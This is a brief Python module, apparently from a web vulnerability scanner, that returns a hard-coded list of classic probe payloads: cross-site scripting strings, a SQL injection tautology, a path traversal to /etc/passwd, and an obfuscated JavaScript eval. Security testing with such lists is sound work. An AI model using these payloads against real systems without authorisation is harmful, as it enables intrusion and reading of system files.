# modules/mutation_engine.py
def generate_payloads():
    return [
        {"type": "XSS", "payload": "<script>alert(1)</script>"},
        {"type": "XSS", "payload": "<img src=x onerror=alert('xss')>"},
        {"type": "XSS", "payload": "<svg onload=alert(1)>"},
        {"type": "SQLi", "payload": "' OR '1'='1"},
        {"type": "LFI",  "payload": "../../../../etc/passwd"},
        {"type": "JS",   "payload": "eval(String.fromCharCode(60,115,99,114,105,112,116,62))"},
    ]
